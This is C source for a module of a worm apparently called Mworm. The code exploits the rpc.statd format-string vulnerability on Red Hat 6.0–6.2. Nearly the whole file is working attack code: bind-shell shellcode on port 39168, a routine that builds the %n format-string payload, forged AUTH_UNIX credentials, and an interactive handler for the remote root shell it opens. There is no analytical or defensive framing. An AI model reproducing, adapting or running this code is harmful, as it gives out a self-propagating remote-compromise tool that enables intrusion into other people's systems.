   //CheckSTATUS.c
   //Based on Mscan
   //Part of Mworm

   #include "common.h"

   #define SM_PROG 100024
   #define SM_VERS 1
   #define SM_STAT 1
   #define SM_MAXSTRLEN 1024



   char Status_shellcode[] =
   "\x31\xc0"                              /* xorl   %eax,%eax             */
   /* jmp ricochet ------------------------------------------------------- */
   "\xeb\x7c"                              /* jmp    0x7c                  */
   /* kungfu: ------------------------------------------------------------ */
   "\x59"                                  /* popl   %ecx                  */
   "\x89\x41\x10"                          /* movl   %eax,0x10(%ecx)       */
   /* ------------------------------------ socket(2,1,0); ---------------- */
   "\x89\x41\x08"                          /* movl   %eax,0x8(%ecx)        */
   "\xfe\xc0"                              /* incb   %al                   */
   "\x89\x41\x04"                          /* movl   %eax,0x4(%ecx)        */
   "\x89\xc3"                              /* movl   %eax,%ebx             */
   "\xfe\xc0"                              /* incb   %al                   */
   "\x89\x01"                              /* movl   %eax,(%ecx)           */
   "\xb0\x66"                              /* movb   $0x66,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ bind(sd,&sockaddr,16); -------- */
   "\xb3\x02"                              /* movb   $0x2,%bl              */
   "\x89\x59\x0c"                          /* movl   %ebx,0xc(%ecx)        */
   "\xc6\x41\x0e\x99"                      /* movb   $0x99,0xe(%ecx)       */
   "\xc6\x41\x08\x10"                      /* movb   $0x10,0x8(%ecx)       */
   "\x89\x49\x04"                          /* movl   %ecx,0x4(%ecx)        */
   "\x80\x41\x04\x0c"                      /* addb   $0xc,0x4(%ecx)        */
   "\x88\x01"                              /* movb   %al,(%ecx)            */
   "\xb0\x66"                              /* movb   $0x66,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ listen(sd,blah); -------------- */
   "\xb3\x04"                              /* movb   $0x4,%bl              */
   "\xb0\x66"                              /* movb   $0x66,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ accept(sd,0,16); -------------- */
   "\xb3\x05"                              /* movb   $0x5,%bl              */
   "\x30\xc0"                              /* xorb   %al,%al               */
   "\x88\x41\x04"                          /* movb   %al,0x4(%ecx)         */
   "\xb0\x66"                              /* movb   $0x66,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ dup2(cd,0); ------------------- */
   "\x89\xce"                              /* movl   %ecx,%esi             */
   "\x88\xc3"                              /* movb   %al,%bl               */
   "\x31\xc9"                              /* xorl   %ecx,%ecx             */
   "\xb0\x3f"                              /* movb   $0x3f,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ dup2(cd,1); ------------------- */
   "\xfe\xc1"                              /* incb   %cl                   */
   "\xb0\x3f"                              /* movb   $0x3f,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ dup2(cd,2); ------------------- */
   "\xfe\xc1"                              /* incb   %cl                   */
   "\xb0\x3f"                              /* movb   $0x3f,%al             */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ execve("/bin/sh",argv,0); ----- */
   "\xc7\x06\x2f\x62\x69\x6e"              /* movl   $0x6e69622f,(%esi)    */
   "\xc7\x46\x04\x2f\x73\x68\x41"          /* movl   $0x4168732f,0x4(%esi) */
   "\x30\xc0"                              /* xorb   %al,%al               */
   "\x88\x46\x07"                          /* movb   %al,0x7(%esi)         */
   "\x89\x76\x0c"                          /* movl   %esi,0xc(%esi)        */
   "\x8d\x56\x10"                          /* leal   0x10(%esi),%edx       */
   "\x8d\x4e\x0c"                          /* leal   0xc(%esi),%ecx        */
   "\x89\xf3"                              /* movl   %esi,%ebx             */
   "\xb0\x0b"                              /* movb   $0xb,%al              */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ------------------------------------ exit(blah); ------------------- */
   "\xb0\x01"                              /* movb   $0x1,%al              */
   "\xcd\x80"                              /* int    $0x80                 */
   /* ricochet: call kungfu ---------------------------------------------- */
   "\xe8\x7f\xff\xff\xff";                 /* call   -0x81                 */

   enum res
   {
       stat_succ,
       stat_fail
   };

   struct sm_name
   {
       char *mon_name;
   };

   struct sm_stat_res
   {
       enum res res_stat;
       int state;
   };

   struct type
   {
       int type;
       char *desc;
       char *code;
       u_long bufpos;
       int buflen;
       int offset;
       int wipe;
   };

   struct type types[] =
   {
       {0, "Redhat 6.2 (nfs-utils-0.1.6-2)", Status_shellcode, 0xbffff314, 1024, 600, 9},
       {1, "Redhat 6.1 (knfsd-1.4.7-7)", Status_shellcode, 0xbffff314, 1024, 600, 9},
       {2, "Redhat 6.0 (knfsd-1.2.2-4)", Status_shellcode, 0xbffff314, 1024, 600, 9},
       {0, NULL, NULL, 0, 0, 0, 0}
   };

   bool_t
   xdr_sm_name(XDR *xdrs, struct sm_name *objp)
   {
       if (!xdr_string(xdrs, &objp->mon_name, SM_MAXSTRLEN))
           return (FALSE);
       return (TRUE);
   }

   bool_t
   xdr_res(XDR *xdrs, enum res *objp)
   {
       if (!xdr_enum(xdrs, (enum_t *)objp))
           return (FALSE);
       return (TRUE);
   }

   bool_t
   xdr_sm_stat_res(XDR *xdrs, struct sm_stat_res *objp)
   {
       if (!xdr_res(xdrs, &objp->res_stat))
           return (FALSE);
       if (!xdr_int(xdrs, &objp->state))
           return (FALSE);
       return (TRUE);
   }



   void
   STATUS_runshell(int sockd)
   {
       char buff[1024];
       int fmax, ret;
       fd_set fds;

       fmax = max(fileno(stdin), sockd) + 1;
       send(sockd, "cd /; ls -alF; id;\n", 19, 0);

       for(;;)
       {

           FD_ZERO(&fds);
           FD_SET(fileno(stdin), &fds);
           FD_SET(sockd, &fds);

           if(select(fmax, &fds, NULL, NULL, NULL) < 0)
           {
           return;
           }

           if(FD_ISSET(sockd, &fds))
           {
               bzero(buff, sizeof buff);
               if((ret = recv(sockd, buff, sizeof buff, 0)) < 0)
               {
                   return;
           }
               if(!ret)
               {
           return;
               }
               write(fileno(stdout), buff, ret);
           }

           if(FD_ISSET(fileno(stdin), &fds))
           {
               bzero(buff, sizeof buff);
               ret = read(fileno(stdin), buff, sizeof buff);
               errno = 0;
               if(send(sockd, buff, ret, 0) != ret)
               {
                   return;
           }
           }
       }
   }


   void
   STATUS_connection(char * hostip, struct host *iptr)
   {
       int sockd;


       sockd=TCP_NB_connect(iptr->h_network,39168,CONNECT_TIME);
       if (sockd <=0 ) return;
   //      STATUS_runshell(sockd);
       FTP_shell(sockd);
       close(sockd);
   }


   char *
   STATUS_wizardry(char *sc, u_long bufpos, int buflen, int offset, int wipe)
   {
       int i, j, cnt, pad;
       char pbyte, *buff, *ptr;
       u_long retpos;
       u_long dstpos;


       while(bufpos % 4) bufpos--;
       /* buflen + ebp */
       retpos = bufpos + buflen + 4;

   /*
   ** 0x00 == '\0'
   ** 0x25 == '%'
   ** (add troublesome bytes)
   ** Alignment requirements aid comparisons
   */

       pbyte = retpos & 0xff;

       /* Yes, it's 0x24 */
       if(pbyte == 0x00 || pbyte == 0x24)
       {
       return NULL;
       }

   /*
   ** Unless the user gives us a psychotic value,
   ** the address should now be clean.
   */

       /* str */
       cnt = 24;
       /* 1 = process nul */
       buflen -= cnt + 1;

       if(!(buff = malloc(buflen + 1)))
       {
           perror("malloc()");
           exit(EXIT_FAILURE);
       }

       ptr = buff;
       memset(ptr, NOP, buflen);

       for(i = 0; i < 4; i++, retpos++)
       {
           /* junk dword */
           for(j = 0; j < 4; j++)
               *ptr++ = retpos >> j * 8 & 0xff;
           /* r + i */
           memcpy(ptr, ptr - 4, 4);
           ptr += 4; cnt += 8;
       }

       /* restore */
       retpos -= 4;

       for(i = 0; i < wipe; i++)
       {
           /* consistent calculations */
           strncpy(ptr, "%8x", 3);
           ptr += 3; cnt += 8;
       }

       dstpos = bufpos + offset;

   /*
   ** This small algorithm of mine can be used
   ** to obtain "difficult" values..
   */

       for(i = 0; i < 4; i++)
       {
           pad = dstpos >> i * 8 & 0xff;
           if(pad == (cnt & 0xff))
           {
               sprintf(ptr, "%%n%%n");
               ptr += 4; continue;
           }
           else
           {
               int tmp;
               /* 0xffffffff = display count of 8 */
               while(pad < cnt || pad % cnt <= 8) pad += 0x100;
               pad -= cnt, cnt += pad;
               /* the source of this evil */
               tmp = sprintf(ptr, "%%%dx%%n", pad);
               ptr += tmp;
           }

       }

       *ptr = NOP;
       /* plug in the shellcode */
       memcpy(buff + buflen - strlen(sc), sc, strlen(sc));
       buff[buflen] = '\0';

   #ifdef DEBUG
       printf("buffer: %#lx length: %d (+str/+nul)\n", bufpos, strlen(buff));
       printf("target: %#lx new: %#lx (offset: %d)\n", retpos, dstpos, offset);
       printf("wiping %d dwords\n", wipe);
   #endif

       return buff;
   }

   struct in_addr
   STATUS_getip(char *host)
   {
       struct hostent *hs;

       if((hs = gethostbyname(host)) == NULL)
       {
           herror("gethostbyname()");
           exit(EXIT_FAILURE);
       }

       return *((struct in_addr *) hs->h_addr);
   }


   int
   Handle_Port_STATUS(int fd,char *hostip,struct host *iptr)  //Handle rpc.statd, return 1 if success
   {
       int ch;
       char *buff;

       CLIENT *clnt;
       enum clnt_stat res;
       struct timeval tv, tvr;
       struct sm_name smname;
       struct sm_stat_res smres;
       struct sockaddr_in addr;

       int type = -1;
       int usetcp = 0;
       int timeout = 5;
       int wipe = 9;
       int offset = 600;
       int buflen = 1024;
       char *sc = Status_shellcode;
       u_short port = 0;
       u_long bufpos = 0;

       int sockp = RPC_ANYSOCK;


       type = 0;
      if(type >= 0)
       {
           if(type >= sizeof types / sizeof types[0] - 1)
           {
               return -1;
           }

           sc = types[type].code;
           bufpos = types[type].bufpos;
           buflen = types[type].buflen;
           offset = types[type].offset;
           wipe = types[type].wipe;
       }

       if(!bufpos)  return -1;
       bzero(&addr, sizeof addr);
       addr.sin_family = AF_INET;
       addr.sin_port = htons(port);
       addr.sin_addr = STATUS_getip(hostip);

       tv.tv_sec = timeout;
       tv.tv_usec = 0;


       clnt = clnttcp_create(&addr, SM_PROG, SM_VERS, &sockp, 0, 0);
       if(clnt == NULL)
       {
       return -1;
        }

       /* AUTH_UNIX / AUTH_SYS authentication forgery */
       clnt->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);

       buff = STATUS_wizardry(sc, bufpos, buflen, offset, wipe);
       if(buff==NULL)  return -1;
       smname.mon_name = buff;

       res = clnt_call(clnt, SM_STAT, (xdrproc_t) xdr_sm_name,
           (caddr_t) &smname, (xdrproc_t) xdr_sm_stat_res,
           (caddr_t) &smres, tv);

       free(buff);
       clnt_destroy(clnt);

       if(res != RPC_SUCCESS)
       {
   #ifdef DEBUG
           printf("A timeout was expected. Attempting connection to shell..\n");
   #endif
       return 1 ;
   //        sleep(5); STATUS_connection(addr);
       }

       return -1;
   }


   int rpcSTATUS_vuln (char * hostip, struct host *iptr) //if Handle_Port_STATUS =1 the do
   {
       sleep(5); STATUS_connection(hostip,iptr); return 1;
   }
